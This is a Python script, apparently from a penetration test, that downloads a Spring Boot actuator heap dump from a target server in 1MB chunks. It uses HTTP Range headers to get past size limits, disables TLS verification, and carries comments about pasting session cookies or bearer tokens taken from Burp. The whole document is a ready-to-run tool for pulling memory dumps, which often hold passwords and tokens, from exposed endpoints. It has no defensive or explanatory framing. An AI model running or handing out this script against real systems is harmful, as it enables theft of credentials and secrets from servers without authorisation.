import requests

# CONFIGURATION
url = "https://target.com/actuator/heapdump"
output_file = "heapdump.hprof.gz"
chunk_size = 1 * 1024 * 1024  # 1MB chunks (Safe mode)

# HEADERS (Copy your Cookie/Authorization from Burp)
headers = {
    "User-Agent": "Mozilla/5.0",
    # "Cookie": "JSESSIONID=...; other_cookie=...",
    # "Authorization": "Bearer ..." 
}

# EXECUTION
current_byte = 0
# Retrieve total size from the error header in your screenshot or a HEAD request
# We know it's roughly 290MB, but the loop handles detection.

print(f"[*] Starting download from {url} in {chunk_size/1024/1024}MB chunks...")

with open(output_file, "wb") as f:
    while True:
        # Range is inclusive, so we subtract 1 from the end
        range_header = f"bytes={current_byte}-{current_byte + chunk_size - 1}"
        headers["Range"] = range_header
        
        print(f"[*] Requesting {range_header}...", end=" ", flush=True)
        
        try:
            # Verify=False to ignore SSL cert errors (common in pentests)
            r = requests.get(url, headers=headers, verify=False, stream=True)
            
            if r.status_code == 206:
                f.write(r.content)
                bytes_received = len(r.content)
                current_byte += bytes_received
                print(f"[OK] Got {bytes_received} bytes.")
                
                # Check if we reached the end of the file
                content_range = r.headers.get("Content-Range", "")
                if "/" in content_range:
                    total_size = int(content_range.split("/")[-1])
                    if current_byte >= total_size:
                        print(f"\n[+] Download Complete! Total size: {current_byte} bytes")
                        break
            
            elif r.status_code == 416:
                print(f"\n[+] Hit end of file (416). Download Complete.")
                break
                
            elif r.status_code == 413:
                print("\n[!] 413 Error: Chunk still too big. Lower chunk_size in script.")
                break
                
            else:
                print(f"\n[!] Unexpected status: {r.status_code}")
                # Optional: print(r.text) to debug
                break
                
        except Exception as e:
            print(f"\n[!] Connection error: {e}")
            break
